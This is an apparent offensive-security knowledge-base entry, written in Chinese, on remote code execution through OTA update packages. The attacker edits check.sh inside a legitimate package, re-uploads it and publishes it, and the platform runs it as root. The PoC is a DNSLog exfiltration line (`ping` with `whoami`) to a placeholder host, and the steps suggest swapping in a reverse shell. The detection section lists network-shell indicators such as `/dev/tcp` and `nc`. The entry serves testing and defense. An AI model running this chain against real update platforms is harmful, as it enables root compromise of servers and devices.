---
id: web-generic-file-upload-ota-package-script-injection-rce
title: OTA 升级包脚本注入：上传篡改 check.sh/ota.sh 的更新包，发布即执行 RCE
type: scenario
domain: web
path: web/generic/file-upload
technique: ota-package-script-injection-rce
tags:
- web
- file-upload
- ota
- rce
- update
- supply-chain
- automotive
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V213
  verified_at: '2026-11-07T04:23:33+08:00'
  notes: 已对照原文与 img/15-19 核对：下载既有 OTA 包、check.sh 首行插入 ping -c 3 whoami 的 dnslog 命令、发布后升级日志与 root 解析记录一致；保留。
url: /docs/web/generic/file-upload/web-generic-file-upload-ota-package-script-injection-rce/
draft: false
kb_aliases:
- OTA 升级包 RCE
- ota.sh 注入
- check.sh 注入
- 汽车 OTA 平台
- 升级包脚本执行
- OTA 文件发布
---

## 一句话结论

OTA 管理平台允许管理员上传 ZIP 升级包，并在“发布版本”时自动执行包内脚本；攻击者下载合法 OTA 包分析入口脚本（`ota.sh`/`check.sh`），插入反弹或探测命令后重新打包上传为新版本并发布，平台执行升级包时以服务账户（常为 root）运行恶意命令，形成 RCE。

## 原理

- 典型 OTA 包是包含 `manifest.yaml`、`ota.sh`、`check.sh`、`backup.sh`、`install.sh`、`resources/` 等内容的 ZIP；平台在升级时按顺序执行这些 Shell/Python 脚本。
- 多数 OTA 管理平台只校验包结构/版本号，不校验数字签名或哈希；发布版本即触发升级任务，脚本以运行 OTA 服务的账户执行（文章目标为 root）。
- 攻击者不需要构造新包：下载平台上已有的合法 OTA 包，逆向 `ota.sh` 找到最先执行的脚本（如 `check.sh`），在开头插入命令，保持其余结构和文件不变，重新压缩为同名/新版本包上传。
- 文章在 `check.sh` 第一行插入 `ping -c 3 \`whoami\`.xxxx.dnslog.cn`，发布后在 DNSLog 收到解析记录；若换反弹 Shell 即可获得服务器权限。
- 该链的本质是“可信更新通道 + 无完整性校验 + 高权限执行”：攻击者只要拿到上传/发布权限（弱口令即可），就能借平台的正常升级流程执行任意命令。

## 触发条件

- 能登录 OTA 管理后台（弱口令/默认口令/凭据泄露），并拥有版本上传与发布权限。
- 平台的 OTA 包不校验签名/哈希，或校验可绕过；升级脚本以高权限（root/服务账户）执行。
- 升级流程会自动执行包内脚本（`ota.sh`/`check.sh`/`install.sh` 等）。
- 目标服务器允许出站网络（反弹 Shell/DNSLog）或可通过其他方式验证执行。

## 利用步骤

1. 登录 OTA 后台，进入“版本管理/升级记录”，下载一个已有的合法 OTA 包。
2. 解压分析目录结构与入口脚本，确认最先执行的脚本（文章为 `check.sh`）以及可用参数。
3. 在入口脚本开头插入验证命令，例如 `ping -c 3 \`whoami\`.<id>.dnslog.cn`，保持其余脚本不变。
4. 重新打包为 ZIP，在“创建新版本”中填写版本号、设备类型、供应商，上传 OTA 包。
5. 点击“发布版本”，等待平台执行升级；在 DNSLog/监听端确认命令执行。
6. 验证成功后，把探测命令替换为反弹 Shell（授权测试应停在验证阶段）。

## PoC

修改后的 `check.sh` 开头（文章形态）：

```bash
ping -c 3 `whoami`.xxxx.dnslog.cn
device_type=$1
# 以下是原始检查逻辑...
```

OTA 包结构（文章示例）：

```text
ota/
├── manifest.yaml
├── ota.sh              # 升级主入口
├── check.sh            # 最先执行的检查脚本
├── backup.sh
├── install.sh
├── resources/
│   ├── etcd/
│   ├── nginx/
│   └── services/
```

发布后的升级任务日志（文章）：

```text
[2025-07-22 20:01:09] 资源文件下载完成 (41/41)
[2025-07-22 20:01:09] 资源下载完成，等待执行OTA
```

DNSLog 收到 `root.<id>.dnslog.cn` 解析，证明命令以 root 执行。

## 变体与关联

- 变体：修改 `ota.sh`、`install.sh`、`backup.sh`、`manifest.yaml`、Python 更新脚本或二进制文件；可在多个脚本中冗余植入。
- 变体：通过中间人劫持 OTA 下载通道，替换更新包；或在供应商/镜像源侧篡改。
- 变体：利用 MinIO 上传、对象存储覆盖等 OTA 包投递方式。
- 关联：[[web-generic-file-upload-crond-path-traversal-rce]]（同为上传后借合法执行机制 RCE）。
- 关联：[[iot-industrial-mms-filewrite-firmware-upload-forensics]]（固件上传/写入的取证与风险）。
- 边界：OTA 包强制签名校验且私钥不可得、升级脚本在低权限沙箱执行、发布权限与上传权限分离且需二次审批时，该手法不成立或难以利用。

## 检测与防御

- 检测：OTA 版本上传后短时间发布并执行；包内 `ota.sh`/`check.sh` 出现 `ping`、`curl`、`wget`、`bash -i`、`/dev/tcp`、`nc` 等异常命令；升级任务日志出现非预期外连。
- 防御：对 OTA 包做数字签名/哈希校验，并在执行前验证签名；升级脚本在低权限沙箱运行；上传与发布权限分离，发布需二次审批。
- 加固：记录 OTA 包哈希与版本变更，监控升级脚本内容；限制 OTA 服务器出站网络；供应商侧同样要做包完整性校验。
